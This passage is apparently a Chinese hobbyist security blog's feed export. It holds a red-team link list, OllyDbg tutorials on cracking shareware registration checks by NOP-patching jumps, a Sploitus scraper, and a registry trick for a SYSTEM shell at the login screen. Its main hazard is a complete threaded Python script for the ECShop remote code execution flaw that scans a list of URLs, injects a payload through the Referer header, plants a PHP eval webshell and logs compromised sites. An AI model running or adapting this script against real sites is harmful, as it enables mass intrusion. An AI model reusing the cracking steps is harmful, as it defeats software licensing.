rel="noopener">http://www.secist.com/archives/7096.html</a></div></span><br></div><br><hr><br><a name="2005"><br><br><div><span><div><a href="https://github.com/foobarto/redteam-notebook/blob/master/README.md" target="_blank" rel="noopener">https://github.com/foobarto/redteam-notebook/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="2011"><br><br><div><span><div><a href="https://bohops.com/" target="_blank" rel="noopener">https://bohops.com/</a></div></span><br></div><br><hr><br><a name="2018"><br><br><div><span><div><a href="https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/" target="_blank" rel="noopener">https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/</a></div><div><br></div><div><br></div><div>在登陆屏幕打开cmd</div></span><br></div><br><hr><br><a name="2019"><br><br><div><span><div><a href="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/" target="_blank" rel="noopener">https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/</a></div></span><br></div><br><hr><br><a name="2043"><br><br><div><span><div><a href="https://rmusser.net/docs/Privilege%20Escalation%20&amp;%20Post-Exploitation.html#dll" target="_blank" rel="noopener">https://rmusser.net/docs/Privilege%20Escalation%20&amp;%20Post-Exploitation.html#dll</a></div></span><br></div><br><hr><br><a name="2045"><br><br><div><span><div><a href="https://wiki.exploitpedia.org/view/Main_Page" target="_blank" rel="noopener">https://wiki.exploitpedia.org/view/Main_Page</a><i style="box-sizing: inherit; color: rgb(255, 255, 255); font-family: &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 17.5px; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(0, 0, 0); text-decoration-style: initial; text-decoration-color: initial;"><b style="box-sizing: inherit; font-weight: bold;"><font style="box-sizing: inherit; vertical-align: inherit;"><font style="box-sizing: inherit; vertical-align: inherit;">exploitpedia.org是一个渗透测试和红队运营维基</font></font></b></i></div></span><br></div><br><hr><br><a name="2047"><br><br><div><span><div><a href="http://www.ggsec.cn/com-xml.html" target="_blank" rel="noopener">http://www.ggsec.cn/com-xml.html</a></div></span><br></div><br><hr><br><a name="2048"><br><br><div><span><div><a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections" target="_blank" rel="noopener">https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections</a></div></span><br></div><br><hr><br><br><a name="2068"><br><br><div><br><span><div><a href="http://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/" target="_blank" rel="noopener">http://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/</a></div></span><br></div></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></a></body></html> </p><p>自己画的渗透流程图：<br>          <img src="https://s1.ax1x.com/2018/09/17/iZGkWt.md.png" alt="iZGkWt.md.png"></p><p>转载请声明：转自<a href="mailto:422926799@github.io" target="_blank" rel="noopener">422926799@github.io</a></p></dt></dt></dt></dt></dt></dt></dt></dt></dt></p></dt></dt></p></dt></p></dl></body></html>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>针对VB的破解</title>
      <link href="/posts/fd7e8bb2.html"/>
      <url>/posts/fd7e8bb2.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shark恒的教程去到第一期的第十一课，针对vb的窗口破解。因为vb没有任何办法搜索关键字进行断点<br>另外还学到了如何识别PE是vb。<br><a href="http://img0.imgtn.bdimg.com/it/u=2358224950,2183871480&amp;fm=26&amp;gp=0.jpg" target="_blank" rel="noopener"></a><img src="https://s1.ax1x.com/2018/09/15/iVCE4I.jpg" alt="iVCE4I.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第十一课的课件是，系统加速的exe。首先还是常规操作，将PE拖入到PEID查壳<br><img src="https://s1.ax1x.com/2018/09/15/iVCwb4.png" alt="iVCwb4.png"><br>无壳，将其载入OD<br><img src="https://s1.ax1x.com/2018/09/15/iVCc26.md.png" alt="iVCc26.md.png"><br>发现满足VB程序的条件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有一个push,jmp &amp;MSVBxxx,往上拉还能发现vb的函数</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/09/15/iVCWrD.png" alt="iVCWrD.png"><br>通过弹窗来寻找关键跳，F9运行程序，输入假码，点击VB选择BP rtcMsgBox窗口弹出函数<br><img src="https://s1.ax1x.com/2018/09/15/iVCIIA.md.png" alt="iVCIIA.md.png"><br>点击注册发现被断了下来，(来到了系统领空)<br><img src="https://s1.ax1x.com/2018/09/15/iVCTPI.md.png" alt="iVCTPI.md.png"><br>Alt+F9跳出系统领空去到程序领空。<br><img src="https://s1.ax1x.com/2018/09/15/iVCbxf.md.png" alt="iVCbxf.md.png"><br>发现我们刚刚从一个call走了出来<br><img src="https://s1.ax1x.com/2018/09/15/iVCLM8.md.png" alt="iVCLM8.md.png"><br>往上面观察发现了一个jmp跳转，跳过了错误，上去看看<br><img src="https://s1.ax1x.com/2018/09/15/iVCOsS.png" alt="iVCOsS.png"><br>发现jmp被跳过了，发现一个跳到lea的标志。点击跟随跳转<br><img src="https://s1.ax1x.com/2018/09/15/iVPALF.md.png" alt="iVPALF.md.png"><br>发现关键跳，将其下断点尝试<br><img src="https://s1.ax1x.com/2018/09/15/iVPeo9.md.png" alt="iVPeo9.md.png"><br>重启程序，点击注册，发现成功断了下来<br><img src="https://s1.ax1x.com/2018/09/15/iVPJdH.md.png" alt="iVPJdH.md.png"><br>进行NOP填充即可<br><img src="https://s1.ax1x.com/2018/09/15/iVPUJI.md.png" alt="iVPUJI.md.png"><br>重新运行程序，发现已经破解<br><img src="https://s1.ax1x.com/2018/09/15/iVPaWt.png" alt="iVPaWt.png"></p><p><img src="https://s1.ax1x.com/2018/09/15/iVPseg.png" alt="iVPseg.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">遇见VB写的PE我们可以使用，今天这种断点弹窗的方法</span><br><span class="line">进行断点，然后寻找关键跳</span><br></pre></td></tr></table></figure><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取sploitus的记录</title>
      <link href="/posts/b2d37895.html"/>
      <url>/posts/b2d37895.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上学的第二个星期回到家，在这个星期翻到一个不错的搜索引擎。果断将其爬下来<br><a href="https://sploitus.com/" target="_blank" rel="noopener">💀 Sploitus | Exploit &amp; Hacktool Search Engine</a><br><img src="https://s1.ax1x.com/2018/09/14/iEhkDg.png" alt="iEhkDg.png"><br>Music：<embed src="//music.163.com/style/swf/widget.swf?sid=5240550&type=2&auto=1&width=320&height=66" width="340" height="86" allownetworking="all"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先请求URL然后抓包<br><img src="https://s1.ax1x.com/2018/09/14/iEhe5n.md.png" alt="iEhe5n.md.png"><br>逐个观察，发现search返回了搜索的内容那么就看他了<br><img src="https://s1.ax1x.com/2018/09/14/iEhnCq.md.png" alt="iEhnCq.md.png"><br>返回是json<br><img src="attachments\96137825.png" alt="96137825.png"></p><p>爬虫思路：<br><code>发现有accept: application/json请求头，那么就很简单了带上user-agent头和accept头和对应的请求参数post请求格式化json即可</code><br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">banner=&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">   .dMMMb  dMMMMb  dMP    .aMMMb  dMP dMMMMMMP dMP dMP .dMMMb </span><br><span class="line">  dMP&quot; VP dMP.dMP dMP    dMP&quot;dMP amr    dMP   dMP dMP dMP&quot; VP </span><br><span class="line">  VMMMb  dMMMMP&quot; dMP    dMP dMP dMP    dMP   dMP dMP  VMMMb   </span><br><span class="line">dP .dMP dMP     dMP    dMP.aMP dMP    dMP   dMP.aMP dP .dMP   </span><br><span class="line">VMMMP&quot; dMP     dMMMMMP VMMMP&quot; dMP    dMP    VMMMP&quot;  VMMMP&quot; </span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">print(banner)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;author:Nine world&apos;)</span><br><span class="line">print(&apos;--------------------------------------------------------------------------------------&apos;)</span><br><span class="line">def sploitus():</span><br><span class="line">    #headers=&#123;&apos;user-agent&apos;:&apos;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;,&apos;content-type&apos;: &apos;application/json&apos;,&apos;accept&apos;: &apos;application/json&apos;,&apos;referer&apos;: &apos;https://sploitus.com/?query=MS17-010&apos;&#125;</span><br><span class="line">    print(&apos;[!] Please select type&apos;)</span><br><span class="line">    print(&apos;exploits&apos;)</span><br><span class="line">    print(&apos;tools&apos;)</span><br><span class="line">    xz=input(&apos;type:&apos;)</span><br><span class="line">    user=input(&apos;query:&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    headers=&#123;</span><br><span class="line">    &apos;accept&apos;: &apos;application/json&apos;,</span><br><span class="line">    &apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    url=&apos;https://sploitus.com/search&apos;</span><br><span class="line">    data=&#123;&apos;offset&apos;:0,&apos;query&apos;:&quot;&#123;&#125;&quot;.format(user),&apos;sort&apos;:&quot;default&quot;,&apos;title&apos;:&apos;false&apos;,&apos;type&apos;:&quot;&#123;&#125;&quot;.format(xz)&#125;</span><br><span class="line">    cookie=&#123;&apos;__cfduid&apos;:&apos;d7ecd3f6052b48a13d4a47e83dbdd15eb1536914053&apos;&#125;</span><br><span class="line">    requt=requests.post(url=url,headers=headers,json=data,cookies=cookie)</span><br><span class="line">    jds=requt.json()</span><br><span class="line">    lp=jds[&apos;exploits&apos;][0:]</span><br><span class="line">    for l in lp:</span><br><span class="line">        print(&apos;title:&apos;,l[&apos;title&apos;])</span><br><span class="line">        #print(&apos;published&apos;,l[&apos;published&apos;])</span><br><span class="line">        print(&apos;id&apos;,l[&apos;id&apos;])</span><br><span class="line">        print(&apos;type:&apos;,l[&apos;type&apos;])</span><br><span class="line">        print(&apos;url:&apos;,l[&apos;href&apos;])</span><br><span class="line">        print(&apos;&apos;)</span><br><span class="line">sploitus()</span><br></pre></td></tr></table></figure></p><p>测试截图：<br><img src="https://s1.ax1x.com/2018/09/14/iEhY5R.png" alt="iEhY5R.png"></p><p><img src="https://s1.ax1x.com/2018/09/14/iEhU8x.png" alt="iEhU8x.png"></p><p>转载请注明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>万能断点了解一下</title>
      <link href="/posts/7d87ec35.html"/>
      <url>/posts/7d87ec35.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>放假了，继续学破解。shark恒第10课，万能断点。主要用在PE头别修改的问题上。<br>下面开始说正事了哈<br><img src="https://s1.ax1x.com/2018/09/08/iPfbi8.jpg" alt="iPfbi8.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>第10课的课件是MP3转换器，首先拿去查壳（常规操作）<br><img src="https://s1.ax1x.com/2018/09/08/iPhSZq.png" alt="iPhSZq.png"><br>载入OD(在OD可以更加直观的看到PE头被修改了)<br><img src="https://s1.ax1x.com/2018/09/08/iPhPiT.png" alt="iPhPiT.png"><br>然后F9运行程序<br><img src="https://s1.ax1x.com/2018/09/08/iPhlWD.png" alt="iPhlWD.png"><br>回到反汇编窗口，右键单击查看-&gt;user32模块<br><img src="https://s1.ax1x.com/2018/09/08/iPhGyd.png" alt="iPhGyd.png"><br>然后在user32模块里右键-&gt;查找-&gt;二进制字符串，搜索F3 A5 8B C8 83 E1 03 F3 A4 E8(万能断点处)<br><img src="https://s1.ax1x.com/2018/09/08/iPhUTP.png" alt="iPhUTP.png"><br>然后点击确定就会跳到反汇编窗口(注意：系统领空)<br><img src="https://s1.ax1x.com/2018/09/08/iPhwY8.md.png" alt="iPhwY8.md.png"><br>打开PE输入好假码之后进行，断点操作<br><img src="https://s1.ax1x.com/2018/09/08/iPhyOs.png" alt="iPhyOs.png"><br>点击确认后，发现程序断了下来<br><img src="https://s1.ax1x.com/2018/09/08/iPhgwq.png" alt="iPhgwq.png"><br>Alt+F9跳出系统领空<br><img src="https://s1.ax1x.com/2018/09/08/iPhfYT.png" alt="iPhfYT.png"><br>然后F8单步就能见到假码，真码，真码与假码对比<br>(真码)<br><img src="https://s1.ax1x.com/2018/09/08/iPhXtK.png" alt="iPhXtK.png"><br>(真假码对比)<br><img src="https://s1.ax1x.com/2018/09/08/iP4S6H.md.png" alt="iP4S6H.md.png"><br>(将真码拷贝出来，关闭OD)注册即可<br><img src="https://s1.ax1x.com/2018/09/08/iP4pXd.md.png" alt="iP4pXd.md.png"></p><p>这些天破解的总结<br><code></code></p><html><br><head><meta name="generator" content="Hexo 3.8.0"><br>  <title>Evernote Export</title><br>  <basefont face="微软雅黑" size="2"><br>  <meta http-equiv="Content-Type" content="text/html;charset=utf-8"><br>  <meta name="exporter-version" content="YXBJ Windows/600240 (zh-CN, DDL); Windows/6.1.1 (Win64);"><br>  <style><br>    body, td {<br>      font-family: 微软雅黑;<br>      font-size: 10pt;<br>    }<br>  </style><br></head><br><body><br><a name="1938"><br><br><div><span><div>逆向第二课总结<br>破解要用反向思维来想。比如他跳转不成功进入到报错。那他跳转成功是否是正确的呢？<br><br></div><div>注意:当修改CPU区的代码的时候按空格，修改必须保证修改的代码为16进制</div></span><br></div><br><hr><br><a name="1939"><br><br><div><br><span><div>逆向第一课总结:</div><div><br></div><div>1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。</div><div><br></div><div>2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个</div><div><br></div><div>3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符&gt;</div><div>，然后进行noop填聪(就是什么也没有)，然后软件就破解了。</div><div><br></div><div><br></div><div>自己可以考虑用C写个简单的登陆程序，进行破解。完毕</div><div><br></div><div>注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。</div><div><br></div><div>破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字</div></span><br></div><br><hr><br><a name="1952"><br><br><div><span><div>破解不联网登陆软件</div><div>常规思路就是:查壳，脱壳，然后拖入od，看看他有没有跳过什么，如果是红色线跳转的话noop填充把跳转删了，如果是灰色线跳转不超过的话，把开始跳转的汇编代码改为jmp 无条件跳转，如果有个x前面加个0</div></span><br></div><br><hr><br><a name="1958"><br><br><div><br><span><div><a href="https://422926799.github.io/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/">https://422926799.github.io/2018/08/26/ESP%E5%AE%9A%E5%BE%8B/</a></div></span><br></div><br><hr><br><a name="1960"><br><br><div><br><span><div>当你脱壳之后，因为现在壳都有压缩功能。所有脱壳之后文件会变大，如果文件变大了。如果PE有检测文件大小功能，如果文件大小不等于</div><div>有壳时候的大小就会退出PE。判断是否有自效验就是，脱壳后PE打不开。</div><div><br></div><div>破解方法：</div><div>将PE拖入到OD设置API断点-&gt;常用断点-&gt;文件大小断点。F9运行，发现程序被断下来了，在右下角的窗口可以看见判断函数，点击反汇编数据窗口跟踪，然后如果发现。cmp 十六进制（文件大小），然后用Noop填充即可</div></span><br></div><br><hr><br><a name="1964"><br><br><div><br><span><div>一般有关键跳上面就有关键call,z载入OD的程序可以观察一下有什么注册成功之类的关键字。上面就有关键跳和关键call，找主要跳转。如果关键跳跳过了正确程序的话，可以从关键call中进行更改使关键call达到正确的程序，关键call和关键跳中有笔记,test可以仔细观察一下</div></span><br></div><br><hr><br><a name="1980"><br><br><div><br><span><div>一般有注册或者登陆之类的。载入OD找好关键字之后，双击跳到反汇编窗口之后。可以发现判断跳转的都是je</div></span><br></div><br><hr><br><a name="1984"><br><br><div><br><span><div>先用API断点函数下一个ReadFile读文件的函数，如果有壳则用401000跳到字符区。然后搜索关键字，双击关键字跳到反汇编窗口F2下断点，将读文件的断点禁止，运行软件跳到断点</div><div>之后往上看判断，是否有真码</div></span><br></div><br><hr><br><a name="1994"><br><br><div><br><span><div>ini类型重启验证(重启验证之后没有任何关键字提示)，我们就用不了ReadFile类型断点任何在搜索关键字来搜索真码，但是我们可以用BP下个GetPrivateProfileStringA断点，专门用于对付ini重启验证。</div><div>知识点记录：</div><div>程序领空：OD左上角文件名如果文件是程序名就是程序领空</div><div>系统领空：OD左上角文件名如果不是程序名的话就是系统领空</div><div>如果遇见系统领空的话就按Alt+F9(或者在调试按执行到用户代码)跳出系统领空，然后单步寻找真码</div><div><br></div><div><br></div></span><br></div><br><hr><br><a name="2033"><br><br><div><br><span><div>因为PE头部被修改，将PE载入到OD之后直接运行程序。右键-&gt;查找-&gt;模块user32。到了模块user32之后进行查找-&gt;二进制字符串-&gt;搜索：<span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;">F3 A5 8B C8 83 E1 03 F3 A4 E8，双击跳转。然后在合适的步骤下断点，等程序断下来之后</span></div><div><span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;">Alt+F9跳出系统领空，找真码即可。</span></div><div><span style="mso-spacerun: 'yes'; font-family: 楷体; mso-ascii-font-family: Calibri; mso-hansi-font-family: Calibri; mso-bidi-font-family: 'Times New Roman'; font-size: 12.0000pt; mso-font-kerning: 1.0000pt;-en-paragraph:true;"><br></span></div></span><br></div></a></a></a></a></a></a></a></a></a></a></body></html> ]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>另一种获得系统SHELL的方法 - 辅助技术</title>
      <link href="/posts/f638278f.html"/>
      <url>/posts/f638278f.html</url>
      <content type="html"><![CDATA[<h2 id="这里做一个简单的纪录"><a href="#这里做一个简单的纪录" class="headerlink" title="这里做一个简单的纪录"></a>这里做一个简单的纪录</h2><p>原文是来自：<a href="https://oddvar.moe/2018/07/23/another-way-to-get-to-a-system-shell/" target="_blank" rel="noopener">Another way to get to a system shell – Assistive Technology – Oddvar Moe’s Blog</a><br><img src="https://s1.ax1x.com/2018/09/07/iPQBx1.png" alt="iPQBx1.png"></p><p>运行regedit<br><img src="https://s1.ax1x.com/2018/09/07/iPQrKx.png" alt="iPQrKx.png"><br>在注册表里找到<code>HKEY_LOCAL_MACHINE \ SOFTWARE \ Microsoft \ Windows NT \ CurrentVersion \ Accessibility \ ATs \ magnifierpane</code><br><img src="https://s1.ax1x.com/2018/09/07/iPQgaD.png" alt="iPQgaD.png"><br>然后给权限这个项目，修改值就好<br>给注册表权限：<a href="http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html" target="_blank" rel="noopener">http://www.beihaiting.com/a/XTJC/WXP/20150816/7337_2.html</a><br>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPQWPH.md.png" alt="iPQWPH.md.png"><br>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Eschop</title>
      <link href="/posts/8d126442.html"/>
      <url>/posts/8d126442.html</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm,这个洞都是星期一的事情了。只不过我在上学，无奈的一批没办法写博客和进行复现。现在才补上，sorry啊。</p><p><img src="https://s1.ax1x.com/2018/09/07/iPZGkR.jpg" alt="iPZGkR.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞分析原文：ECShop全系列版本远程代码执行高危漏洞分析<br>ECSHOP RCE 漏洞复现教程：VULNSPY实验-ECShop &lt;= 2.7.x 全系列版本远程代码执行高危漏洞利用<br>漏洞复现地址：<a href="https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&amp;autogo=1" target="_blank" rel="noopener">https://www.vsplate.com/?github=vulnspy/ECShop_2.7.3_UTF8_installed&amp;autogo=1</a></p><p>复现完漏洞之后，你就明白得到了其中的思路：</p><p>此脚本的思路：<br><code>首先先判断是否存在远程漏洞，如果有加入列表与写入save.txt判断加入的列表是否有存在漏洞的url，大于0则用正则匹配出url，一个url进行getshell请求。然后那个匹配出来的url加入getshell之后的一句话后门路径。判断是否存在存在就写入txt否则就不写入....可能说的比较不清楚</code></p><p>代码：<br><figure class="highlight plain"><figcaption><span>requests</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">xj=open(&apos;save.txt&apos;,&apos;w&apos;)</span><br><span class="line">xj.close()</span><br><span class="line"></span><br><span class="line">cz=[]</span><br><span class="line">def exploit(url):</span><br><span class="line">    url=url+&apos;/user.php&apos;</span><br><span class="line">    header=&#123;&apos;Referer&apos;: &apos;554fcae493e564ee0dc75bdf2ebf94caads|a:3:&#123;s:2:&quot;id&quot;;s:3:&quot;&apos;&quot;&apos;&quot;&apos;/*&quot;;s:3:&quot;num&quot;;s:201:&quot;*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--&quot;;s:4:&quot;name&quot;;s:3:&quot;ads&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca&apos;&#125;</span><br><span class="line">    data=&#123;&apos;action&apos;:&apos;login&apos;,&apos;vulnspy&apos;:&apos;phpinfo();exit;&apos;&#125;</span><br><span class="line">    try:</span><br><span class="line">        reqt=requests.post(url=url,headers=header,data=data,timeout=10)</span><br><span class="line">        if &apos;PHP Version&apos; in reqt.text:</span><br><span class="line">            print(&apos;[+] Remote code execution high-risk vulnerabilities url:&#123;&#125;&apos;.format(reqt.url))</span><br><span class="line">            print(&apos;[+] Remote code execution high-risk vulnerabilities url:&#123;&#125;&apos;.format(reqt.url),file=open(&apos;save.txt&apos;,&apos;a&apos;))</span><br><span class="line">            cz.append(reqt.url)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[-] Not debug url:&#123;&#125;&apos;.format(reqt.url))</span><br><span class="line">    except Exception as g:</span><br><span class="line">        print(&apos;[-] Error &#123;&#125;&apos;.format(g))</span><br><span class="line"></span><br><span class="line">    if len(cz)&gt;0:</span><br><span class="line">        print(&apos;[+] start getshell&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] not debug,Unable to getshell&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    getshellpayloads=&#123;&apos;action&apos;:&apos;login&apos;,&apos;vulnspy&apos;:&apos;eval(base64_decode($_POST[d]));exit;&apos;,&apos;d&apos;:&apos;ZmlsZV9wdXRfY29udGVudHMoJ3Z1bG5zcHkucGhwJywnPD9waHAgZXZhbCgkX1JFUVVFU1RbdnVsbnNweV0pOz8+Jyk7&apos;&#125;</span><br><span class="line"></span><br><span class="line">    for t in cz:</span><br><span class="line">        tx=re.sub(&apos;/user.php&apos;,&apos;&apos;,str(t))</span><br><span class="line">        try:</span><br><span class="line">            reqts2=requests.post(url=t,headers=header,data=getshellpayloads)</span><br><span class="line">            reqts3=requests.post(url=tx+&apos;/vulnspy.php?vulnspy=phpinfo();&apos;)</span><br><span class="line">            if &apos;PHP Version&apos; in reqts3.text:</span><br><span class="line">                print(&apos;[+] Getshell success url:&#123;&#125; password:&#123;&#125;&apos;.format(reqts3.url, &apos;vulnspy&apos;))</span><br><span class="line">                print(&apos;[+] Getshell success url:&#123;&#125; password:&#123;&#125;&apos;.format(reqts3.url,&apos;vulnspy&apos;),file=open(&apos;save.txt&apos;,&apos;a&apos;))</span><br><span class="line">            else:</span><br><span class="line">                print(&apos;[-] Getshell failure url:&#123;&#125;&apos;.format(reqts3.url))</span><br><span class="line">        except Exception as p:</span><br><span class="line">            print(&apos;[-] Error &#123;&#125;&apos;.format(p))</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    user = input(&apos;file:&apos;)</span><br><span class="line">    if os.path.exists(user):</span><br><span class="line">        print(&apos;[+] file &#123;&#125; ok&apos;.format(user))</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] not file &#123;&#125;&apos;.format(user))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    dk=open(&apos;&#123;&#125;&apos;.format(user),&apos;r&apos;)</span><br><span class="line">    for d in dk.readlines():</span><br><span class="line">        qc=&quot;&quot;.join(d.split(&apos;\n&apos;))</span><br><span class="line">        t=threading.Thread(target=exploit,args=(qc.rstrip(&apos;/&apos;),))</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure></p><p>测试结果：<br><img src="https://s1.ax1x.com/2018/09/07/iPe941.png" alt="iPe941.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/09/07/iPepNR.png" alt="iPepNR.png" border="0"></p><p><img src="https://s1.ax1x.com/2018/09/07/iPeMCt.md.png" alt="iPeMCt.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>破解QQ传情</title>
      <link href="/posts/fdcbf63c.html"/>
      <url>/posts/fdcbf63c.html</url>
